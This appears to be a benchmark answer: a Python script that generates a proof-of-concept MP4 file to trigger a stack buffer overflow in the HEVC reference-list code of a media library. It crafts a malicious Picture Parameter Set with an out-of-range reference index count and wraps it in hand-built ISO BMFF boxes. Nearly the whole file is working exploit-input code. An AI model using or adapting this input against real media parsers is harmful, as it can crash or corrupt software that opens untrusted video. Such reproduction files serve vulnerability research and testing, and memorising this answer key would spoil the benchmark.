import struct

class Solution:
    """
    Generates a Proof-of-Concept input to trigger a Stack Buffer Overflow
    in gf_hevc_compute_ref_list() by crafting an MP4 file with a malicious
    HEVC Picture Parameter Set (PPS).
    """
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        
        def box(box_type: bytes, content: bytes) -> bytes:
            """Helper function to create an ISO BMFF box."""
            return struct.pack('>I', len(content) + 8) + box_type + content

        # --- HEVC NAL (Network Abstraction Layer) Units ---

        # A minimal valid Video Parameter Set (VPS)
        NAL_VPS = b'\x40\x01\x0c\x01\xff\xff\x01\x60\x00\x00\x03\x00\xb0\x00\x00\x03\x00\x00\x03\x00\x78\xac\x09'
        
        # A minimal valid Sequence Parameter Set (SPS)
        NAL_SPS = b'\x42\x01\x01\x01\x60\x00\x00\x03\x00\xb0\x00\x00\x03\x00\x00\x03\x00\x78\xa0\x03\xc0\x80\x10\xe5\xa6\x49\x90'
        
        # A malicious Picture Parameter Set (PPS). It has been crafted to contain
        # a `num_ref_idx_l0_default_active_minus1` value far greater than the
        # maximum allowed value of 15. This oversized value causes the vulnerable
        # function to write past the bounds of a stack-allocated array.
        NAL_PPS = b'\x44\x01\xee\xff\xbf\xe8\x40'
        
        # A minimal P-slice that references the malicious PPS (ID 0) to trigger its processing.
        NAL_SLICE = b'\x02\x01\x84\x08\x00'

        def build_poc_parts(mdat_offset: int) -> tuple[bytes, bytes]:
            """Builds the header and mdat sections of the MP4 file for a given mdat offset."""
            
            # --- Build hvcC (HEVC Decoder Configuration Record) ---
            # This record stores the VPS, SPS, and PPS for the decoder.
            hvcC_arrays = b''
            # VPS array
            hvcC_arrays += b'\x20'  # array_completeness=0, NALUnitType=32 (VPS)
            hvcC_arrays += struct.pack('>H', 1)  # numNalus
            hvcC_arrays += struct.pack('>H', len(NAL_VPS)) + NAL_VPS
            # SPS array
            hvcC_arrays += b'\x21'  # NALUnitType=33 (SPS)
            hvcC_arrays += struct.pack('>H', 1)  # numNalus
            hvcC_arrays += struct.pack('>H', len(NAL_SPS)) + NAL_SPS
            # PPS array (malicious)
            hvcC_arrays += b'\x22'  # NALUnitType=34 (PPS)
            hvcC_arrays += struct.pack('>H', 1)  # numNalus
            hvcC_arrays += struct.pack('>H', len(NAL_PPS)) + NAL_PPS

            hvcC_config = (
                b'\x01' +                          # configurationVersion
                b'\x01\x60\x00\x00\x00' +          # general_profile_space, tier_flag, profile_idc, etc
                b'\xb0\x00\x00\x00\x00\x00' +      # general_constraint_indicator_flags
                b'\x78' +                          # general_level_idc
                b'\xf0\x00' +                      # min_spatial_segmentation_idc
                b'\xfc' +                          # parallelismType
                b'\xfc' +                          # chromaFormat
                b'\xf8' +                          # bitDepthLumaMinus8
                b'\xf8' +                          # bitDepthChromaMinus8
                b'\x00\x00' +                      # avgFrameRate
                b'\xdd' +                          # constantFrameRate, numTemporalLayers, temporalIdNested, lengthSizeMinusOne=3 (4 bytes)
                b'\x03' +                          # numOfArrays
                hvcC_arrays
            )
            hvcC = box(b'hvcC', hvcC_config)

            # --- Build stsd (Sample Description Box) ---
            hvc1_content = (
                b'\x00' * 6 + b'\x00\x01' +       # Reserved, data_reference_index
                b'\x00' * 16 +                    # Pre-defined
                b'\x00\x20\x00\x20' +             # width, height (32x32)
                b'\x00\x48\x00\x00' * 2 +         # horiz/vert resolution
                b'\x00' * 4 + b'\x00\x01' +       # Reserved, frame_count
                b'\x00' * 32 +                    # compressorname
                b'\x00\x18\xff\xff' +             # depth, pre-defined
                hvcC
            )
            hvc1 = box(b'hvc1', hvc1_content)
            stsd = box(b'stsd', b'\x00\x00\x00\x00\x00\x00\x00\x01' + hvc1)
            
            # --- Build stbl (Sample Table Box) ---
            stts = box(b'stts', b'\x00' * 8) # Time-to-Sample
            stsc = box(b'stsc', b'\x00' * 8) # Sample-to-Chunk
            stsz = box(b'stsz', b'\x00\x00\x00\x00\x00\x00\x00\x01' + struct.pack('>I', len(NAL_SLICE))) # Sample Size
            stco = box(b'stco', b'\x00\x00\x00\x00\x00\x00\x00\x01' + struct.pack('>I', mdat_offset)) # Chunk Offset
            stbl = box(b'stbl', stsd + stts + stsc + stsz + stco)
            
            # --- Build minf (Media Information Box) ---
            vmhd = box(b'vmhd', b'\x00\x00\x00\x01' + b'\x00' * 8) # Video Media Header
            dref_url = box(b'url ', b'\x00\x00\x00\x01')
            dref = box(b'dref', b'\x00\x00\x00\x00\x00\x00\x00\x01' + dref_url)
            dinf = box(b'dinf', dref) # Data Information Box
            minf = box(b'minf', vmhd + dinf + stbl)
            
            # --- Build mdia (Media Box) ---
            mdhd = box(b'mdhd', b'\x00'*12 + b'\x00\x00\x03\xe8\x00\x01\x00\x00\x55\xc4\x00\x00') # Media Header
            hdlr = box(b'hdlr', b'\x00'*8 + b'vide' + b'\x00'*12 + b'VideoHandler\x00') # Handler
            mdia = box(b'mdia', mdhd + hdlr + minf)

            # --- Build trak (Track Box) ---
            tkhd = box(b'tkhd', b'\x00\x00\x00\x0f' + b'\x00'*12 + b'\x00\x01' + b'\x00'*52 + b'\x40\x00\x00\x00' + b'\x00\x20\x00\x00\x00\x20\x00\x00') # Track Header
            trak = box(b'trak', tkhd + mdia)

            # --- Build moov (Movie Box) ---
            mvhd = box(b'mvhd', b'\x00'*12 + b'\x00\x01\x5f\x90\x00\x00\x03\xe8' + b'\x00\x01\x00\x00' + b'\x01\x00' + b'\x00'*62 + b'\x02') # Movie Header
            moov = box(b'moov', mvhd + trak)

            # --- Build ftyp (File Type Box) ---
            ftyp = box(b'ftyp', b'isom\x00\x00\x00\x00isomiso2avc1mp41')

            # --- Build mdat (Media Data Box) ---
            mdat_content = struct.pack('>I', len(NAL_SLICE)) + NAL_SLICE
            mdat = box(b'mdat', mdat_content)
            
            header = ftyp + moov
            return header, mdat

        # The size of the MP4 header depends on the stco box, which contains the
        # offset to the mdat box, which itself depends on the size of the header.
        # We can resolve this by calculating the header size with a dummy offset,
        # then using that size to find the real offset and rebuilding the file.
        # Since the size of the offset value itself is fixed (4 bytes), one
        # iteration is sufficient.

        # 1. Build with a dummy offset to calculate header size
        header_dummy, _ = build_poc_parts(0)
        
        # 2. Calculate the final offset
        final_offset = len(header_dummy) + 8 # +8 for mdat box header (size+type)
        
        # 3. Build the final PoC with the correct offset
        final_header, final_mdat = build_poc_parts(final_offset)
        
        return final_header + final_mdat
